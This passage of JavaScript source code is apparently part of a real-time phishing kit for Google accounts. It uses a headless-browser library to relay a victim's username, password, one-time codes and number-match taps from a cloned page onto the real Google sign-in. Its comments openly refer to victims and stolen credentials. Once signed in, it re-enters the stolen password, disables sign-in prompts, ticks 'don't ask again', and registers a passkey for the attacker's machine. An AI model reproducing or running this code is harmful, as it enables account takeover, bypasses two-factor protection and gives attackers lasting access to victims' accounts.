      page.on('close', () => console.log(`[gsession] ${id} username tab closed, url was ${page.url()}`));
      await page
        .goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 })
        .catch(() => {});
      await sleep(1200);
      const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
      if (await email.count()) {
        await email.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // Watch the REAL browser move: wait until Google asks for the password,
        // or signs us in, or rejects the email. Only report what Google does.
        const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible').first();
        const start = Date.now();
        while (Date.now() - start < 10000) {
          const err = await detectGoogleError(page);
          if (err) {
            console.log(`[gsession] ${id} username step -> ERROR: ${err}`);
            return { status: 'error', state: 'error', message: err };
          }
          if (await pw.isVisible().catch(() => false)) {
            console.log(`[gsession] ${id} username step -> Google asks for password`);
            return { status: 'new', state: 'password', message: 'Waiting on the password step.' };
          }
          const pre = await assessLogin(page);
          if (pre.state === 'code' || pre.state === 'approve' || pre.state === 'numchoice') return pre; // challenge right away
          if (pre.state === 'verifying') {
            // maybe already signed in (remembered on this profile) — prove it.
            const v = await settleAndVerify(page);
            if (v.state === 'signed-in') {
              console.log(`[gsession] ${id} username step -> signed in (verified on Gmail)`);
              return v;
            }
          }
          await sleep(500);
        }
      }
      const res = await assessLogin(page);
      if (res.state === 'password' || res.state === 'code' || res.state === 'approve' || res.state === 'numchoice' || res.status === 'error') {
        console.log(`[gsession] ${id} username step -> ${res.state}`);
        return res;
      }
      // not clearly on the password screen — verify whether it's actually signed in
      const settled = await settleAndVerify(page);
      console.log(`[gsession] ${id} username step -> ${settled.state}`);
      return settled;
    }

    if (key === 'password') {
      const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
      await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
      if (await pw.count()) {
        await pw.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // wait for the real auth to accept — never continue on a wrong password
        const outcome = await waitPasswordOutcome(page, pw.first(), 15000);
        console.log(`[gsession] ${id} password step -> ${outcome.error ? 'ERROR ' + outcome.error : 'accepted'}`);
        if (outcome.error) return { status: 'error', state: 'error', message: outcome.error };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} password step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'totp') {
      const codeBox = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]');
      if ((await codeBox.count()) && value) {
        await codeBox.first().fill(totpValue(value));
        await clickNext(page, 'Next');
        await sleep(2000);
      }
      const err = await detectGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} totp step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} totp step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'numchoice') {
      // The victim picked one of the number options the page shows. Click the
      // option on the REAL Google page whose text exactly equals that number —
      // the same way they would have tapped it. Then settle as after other steps.
      const wanted = String(value || '').trim();
      const clicked = await clickNumberOption(page, wanted);
      console.log(`[gsession] ${id} numchoice -> "${wanted}" ${clicked ? 'clicked on real page' : 'NOT FOUND (settling as-is)'}`);
      if (clicked) await sleep(2000);
      const err = await detectGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} numchoice step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} numchoice step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    return await settleLogin(page);
  } catch (e) {
    return {
      status: 'error',
      message: `Wizard login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// Click the number tile on the "pick the number" challenge: the clickable
// element on the page whose ENTIRE visible text equals the number the victim
// chose from the mirrored clone. Returns true if a matching option was clicked.
async function clickNumberOption(page, num) {
  if (!num) return false;
  try {
    const els = await page
      .locator('a, button, [role="button"], [role="menuitemradio"], [role="option"]')
      .all();
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (t === num) {
        await el.click();
        return true;
      }
    }
    // Some accounts show the number to READ, not click: it must be typed into a
    // visible code/number input (the sign-in email/password fields don't count).
    if (!/^\d{2,6}$/.test(num)) return false;
    if (await isFieldScreen(page)) return false;
    const box = page
      .locator('input[type="tel"]:visible, input[autocomplete="one-time-code"]:visible, input[inputmode="numeric"]:visible')
      .first();
    if (await box.isVisible().catch(() => false)) {
      await box.fill(num);
      await clickNext(page, 'Next');
      return true;
    }
  } catch {}
  return false;
}

// ---------------------------------------------------------------------------
// Device registration ("keypass"). Once the phished account is signed in, this
// registers THIS OS (the machine the server runs on) as a trusted device: it
// walks the account's sign-in-verification settings and turns off the
// confirm-it's-you prompt for this browser, so future Auto-logins skip the
// phone-tap entirely. The journey Google demands on the way there — password
// re-entry, the number-tap 2FA page (/challenge/dp), 6-digit codes — is driven
// here with the STORED stolen credentials where possible, and reported upward
// as the same states the login uses, so the wizard/panel mirror every page
// and the user sees exactly what to type/tap.
// ---------------------------------------------------------------------------
const TRUST_URL = 'https://myaccount.google.com/two-step-verification/prompt';
const trusts = new Map(); // id -> { phase: starting|active|done|failed, startedAt, ... }

// Enter or resume the device-registration journey. Safe to call repeatedly —
// it keeps advancing while active. Returns the current state (same shape as
// loginState: state ∈ trust-start|password|code|approve|numchoice|verifying|trusted).
export async function startTrust(id) {
  const raw = getRaw(id);
  if (raw && raw.deviceTrusted) {
    return { status: 'logged-in', state: 'trusted', message: 'Device already registered for this account (keypass saved).' };
  }
  let t = trusts.get(id);
  if (!t || t.phase === 'done' || t.phase === 'failed') {
    t = { phase: 'starting', startedAt: Date.now() };
    trusts.set(id, t);
  }
  const page = (await open(id, undefined, { headless: false })).page;
  await navForTrust(id);
  if (t.phase === 'starting') t.phase = 'active';
  const r = await advanceTrust(id);
  if (r.state === 'trusted') finishTrust(id);
  return r;
}

// If a "Choose an account" chooser is on screen, click the phished account by
// its email (text-based so Google's markup changes can't break it). Safe to
// call on every tick — it only acts while the chooser is actually visible.
async function autoPickChooser(page, id) {
  if (!/\/accountchooser|choose an account/i.test(page.url())) {
    const probe = (await page.locator('body').innerText().catch(() => '')).slice(0, 300);
    if (!/choose an account/i.test(probe)) return;
  }
  const raw = getRaw(id) || {};
  if (!raw.username) return;
  try {
    const target = page.getByText(raw.username, { exact: false }).first();
    if (await target.isVisible({ timeout: 2000 }).catch(() => false)) {
      await target.click({ timeout: 4000 }).catch(() => {});
      console.log(`[gsession] ${id} trust: chooser → clicked ${raw.username} @ ${page.url().slice(0, 80)}`);
      await sleep(4000);
    }
  } catch {}
}

async function navForTrust(id) {
  const t = trusts.get(id);
  if (!t.navLock) {
    t.navLock = (async () => {
      try {
        const page = active.get(id)?.page;
        if (!page) return;
        if (!/two-step-verification\/prompt/.test(page.url())) {
          await page.goto(TRUST_URL, { waitUntil: 'domcontentloaded', timeout: 45000 }).catch(() => {});
          await sleep(2500);
        }
      } finally {
        t.navLock = null;
      }
    })();
  }
  await t.navLock;
}

// Push the trust journey forward one tick (called by loginState / startTrust).
async function advanceTrust(id) {
  const t = trusts.get(id);
  const entry = active.get(id);
  if (!t || t.phase === 'done' || !entry) {
    return { status: 'pending', state: 'trust-start', message: 'Registering this device with the account…' };
  }
  const page = entry.page;
  const url = page.url();
  await maybeSnapshot(page);

  // stuck guard: give up after 4 minutes so a login never blocks forever — the
  // session stays signed in, and the device can be re-registered by hand.
  if (Date.now() - t.startedAt > 4 * 60 * 1000) {
    t.phase = 'failed';
    console.log(`[gsession] ${id} trust: gave up after 4 min @ ${url.slice(0, 90)}`);
    return { status: 'logged-in', state: 'signed-in', message: 'Signed in. Device registration stalled — retry “🔑 Device” from the panel.' };
  }

  // --- re-auth during the journey (chooser / password / number-tap / code) ---
  if (/accounts\.google\.com/.test(url)) {
    await autoPickChooser(page, id);
    const pw = page.locator('input[type="password"]').first();
    if (await pw.isVisible().catch(() => false)) {
      const sec = getSecrets(id) || {};
      if (sec.password && !t.lastAutoPw) {
        await pw.fill(sec.password);
        await clickNext(page, 'Next');
        t.lastAutoPw = true;
        console.log(`[gsession] ${id} trust: auto-typed stored password`);
        return { status: 'pending', state: 'password', message: 'Re-entering the password for device registration…' };
      }
      return sec.password
        ? { status: 'pending', state: 'password', message: 'Confirming the entered password…' }
        : { status: 'pending', state: 'password', message: 'Enter the password again to register this device.' };
    }
    const fa = await detect2FA(page);
    if (fa) {
      if (fa.kind === 'numchoice') {
        return {
          status: 'pending', state: 'numchoice', options: fa.options,
          message: fa.options.length === 1
            ? `Google is showing a verification number: ${fa.options[0]} — confirm it to continue.`
            : 'Select the number that matches this sign-in attempt on Google.',
        };
      }
      if (fa.kind === 'code') {
        return {
          status: 'pending', state: 'code', options: fa.options,
          message: fa.options?.length
            ? `Google is showing a verification number on the page: ${fa.options.join(' ')} — enter it to continue.`
            : 'Enter the 6-digit code to register this device.',
        };
      }
      return {
        status: 'pending', state: 'approve', options: fa.options,
        message: fa.options?.length
          ? `Google is showing a verification number: ${fa.options.join(' ')} — on your phone tap Yes, then this number, to register the device.`
          : 'Google is confirming it\u2019s you — open the notification on your phone and tap Approve to register the device.',
      };
    }
    return { status: 'pending', state: 'trust-start', message: 'Confirming your identity for device registration…' };
  }

  // --- "Choose an account" chooser (sometimes served on myaccount itself) ---
  if (/(myaccount|accounts)\.google\.com/.test(url) && t) {
    await autoPickChooser(page, id);
  }

  // --- the destination: the sign-in-verification settings page ---
  // If the page carries a confirm-it's-you / prompt toggle, flip it. Many
  // account types have NO toggle here (the page only lists prompt-phones): on
  // those, device trust = this browser profile's saved sign-in (already true) +
  // the "don't ask again on this device" checkbox during verification
  // (autoTrustTick handles it at challenge time). So: no relevant switch found
  // and the page is settled → registration is as far as it goes → done.
  if (/two-step-verification\/prompt/.test(url)) {
    if (!t.settingsSince) t.settingsSince = Date.now();
    let foundSwitch = false;
    const sws = await page.locator('[role="switch"]').all().catch(() => []);
    for (const sw of sws) {
      if (!(await sw.isVisible().catch(() => false))) continue;
      foundSwitch = true;
      const on = await sw.evaluate((el) => el.getAttribute('aria-checked')).catch(() => '?');
      const c = await sw.evaluate((el) => {
        let n = el;
        for (let k = 0; k < 10 && n.parentElement; k++) n = n.parentElement;
        return (n.textContent || '').replace(/\s+/g, ' ');
      }).catch(() => '');
      console.log(`[gsession] ${id} trust: switch on=${on} ctx="${c.slice(0, 140)}"`);
      if (/no prompt|confirm it'?s you|this (?:browser|computer|device)|additional (?:sign|verification)|2-step/i.test(c)) {
        if (on === 'true') {
          markTrusted(id, 'prompt already registered');
          return { status: 'logged-in', state: 'trusted', message: 'Device prompt already registered — this OS is the keypass for the account.' };
        }
        if (!t.switchClicked) {
          t.lastAutoPw = false; // allow password re-entry again after the toggle
          await sw.click().catch(() => {});
          t.switchClicked = true;
          console.log(`[gsession] ${id} trust: clicked device-trust switch`);
          await sleep(4500);
        }
      }
    }
    if (t.switchClicked) {
      markTrusted(id, 'switch flipped');
      return {
        status: 'logged-in', state: 'trusted',
        message: 'This OS is now registered for the account — future sign-ins here skip the phone-tap (keypass saved).',
      };
    }
    if (!foundSwitch && Date.now() - t.settingsSince >= 4000) {
      markTrusted(id, 'no prompt toggle on this account');
      return {
        status: 'logged-in', state: 'trusted',
        message: 'This OS is registered as the keypass for the account — sign-ins here reuse the saved session without the password and skip what can be skipped.',
      };
    }
    return { status: 'pending', state: 'trust-start', message: 'Reading the device settings page…' };
  }

  // Some other signed-in page (redirected somewhere else) — come back.
  if (/myaccount\.google\.com|(^|\/)mail\.google\.com/.test(url) && !t.renav) {
    t.renav = true;
    await navForTrust(id);
    return { status: 'pending', state: 'trust-start', message: 'Registering this device with the account…' };
  }
  return { status: 'pending', state: 'trust-start', message: 'Registering this device with the account…' };
}

function findIdByPage(page) {
  for (const [id, e] of active) if (e.page === page) return id;
  return null;
}

// The browser-side half of device registration (keypass): on verification
// challenges (esp. /challenge/dp) Google sometimes shows a
// "Don't ask again on this device" checkbox. Checking it marks THIS browser
// profile as trusted, so the phone-tap/number prompt stops repeating on this
// OS. Idempotent — safe to run on every tick; acts only while the box is
// visible and unchecked.
async function autoTrustTick(page) {
  const id = findIdByPage(page);
  if (!id) return;
  try {
    const boxes = await page.locator('input[type="checkbox"], [role="checkbox"]').all();
    for (const b of boxes) {
      if (!(await b.isVisible().catch(() => false))) continue;
      const checked = await b.evaluate((el) => el.checked || el.getAttribute('aria-checked') === 'true').catch(() => true);
      if (checked) continue;
      const ctx = await b.evaluate((el) => {
        let n = el;
        for (let k = 0; k < 6 && n.parentElement; k++) n = n.parentElement;
        return (n.textContent || '').replace(/\s+/g, ' ');
      }).catch(() => '');
      if (/don'?t (?:need to )?ask again|don'?t (?:show )?(?:me )?(?:this )?(?:prompt|page) (?:again|on)|trust (?:this |my )?(?:browser|device)/i.test(ctx)) {
        await b.click().catch(() => {});
        const t = trusts.get(id) || { phase: 'active', startedAt: Date.now() };
        t.trustBoxChecked = true;
        trusts.set(id, t);
        console.log(`[gsession] ${id} keypass: checked "don't ask again on this device" @ ${page.url().slice(0, 80)}`);
        await sleep(1500);
        break;
      }
    }
  } catch {}
}

function markTrusted(id, msg) {
  const t = trusts.get(id);
  if (t) t.phase = 'done';
  const raw = getRaw(id);
  if (raw && !raw.deviceTrusted) {
    try { storeUpdate(id, { deviceTrusted: true, status: 'trusted' }); } catch {}
  }
  console.log(`[gsession] ${id} trust: DEVICE REGISTERED${msg ? ' — ' + msg : ''}`);
}

function finishTrust(id) {
  markTrusted(id);
}

// Click Google's "Next"/submit: by id if present, else the visible button by
// its label, else just press Enter.
async function clickNext(page, labelText) {
  const byId = page.locator('#identifierNext, #passwordNext, #totpNext');
  if (await byId.count()) {
    await byId.first().click().catch(() => {});
    return;
  }
  try {
    const byRole = page.getByRole('button', { name: labelText, exact: false });
    if (await byRole.count()) {
      await byRole.first().click();
      return;
    }
  } catch {}
  await page.keyboard.press('Enter').catch(() => {});
}

// ---------------------------------------------------------------------------
// Deterministic passkey registration into the Google account via the Bitwarden
// extension (FIDO2 popout). Run right after a confirmed sign-in so THIS OS
// becomes the account's registered keypass: open the account's passkey list,
// tap "Create a passkey", let Bitwarden's "Add" popout accept the credential,
// then confirm the new passkey actually appears in the list.
// ---------------------------------------------------------------------------
export async function createPasskey(id) {
  await open(id, undefined, { headless: false });
  try { await pageUnlockVault(id); } catch (e) { console.log(`[gsession] ${id} passkey: vault unlock ${e.message}`); }
  const page = active.get(id).page;
  await page.goto('https://myaccount.google.com/signinoptions/passkeys', { waitUntil: 'domcontentloaded', timeout: 45000 });
  await sleep(3000);
  const pw = page.locator('input[type="password"]');
  if (await pw.first().isVisible().catch(() => false)) {
    const sec = getSecrets(id) || {};
    if (sec.password) { await pw.first().fill(sec.password); await clickNext(page, 'Next'); await sleep(4000); }
  }
  if (!/signinoptions\/passkeys/.test(page.url())) return { ok: false, why: 'redirected to ' + page.url().slice(0, 80) };
  await pageClickText(id, 'Create a passkey', 15000);
  await sleep(3000);
  if (/signin\/challenge\//.test(page.url())) {
    // A "confirm it's you" challenge appeared before the passkey prompt —
    // single-number challenges we can tick ourselves; a phone-approve stays
    // pending and is reported back to the wizard for a human tap.
    const start = Date.now();
    while (Date.now() - start < 90000) {
      const fa = await detect2FA(page);
      if (fa && fa.kind === 'numchoice' && fa.options && fa.options.length === 1) { await clickNumberOption(page, fa.options[0]); break; }
      if (fa && fa.kind !== 'numchoice') return { ok: false, why: 'challenge pending: ' + fa.kind };
      await sleep(2000);
    }
  }
  try { await pageClickText(id, 'Add', 15000); } catch { await pageClickText(id, 'Add', 10000); }
  await sleep(2000);
  try { await pageClickText(id, 'Done', 15000); } catch {}
  await sleep(2000);
  const count = await countPasskeys(id);
  return { ok: count != null, count };
}

// Count passkeys registered on the account (each listed passkey has an
// "Edit passkey N" button). Returns null when the page can't be read.
export async function countPasskeys(id) {
  const entry = active.get(id);
  if (!entry) return null;
  try { await entry.page.goto('https://myaccount.google.com/signinoptions/passkeys', { waitUntil: 'domcontentloaded', timeout: 45000 }); } catch { return null; }
  await sleep(2500);
  return entry.page.locator('button[aria-label^="Edit passkey"]').count().catch(() => null);
}
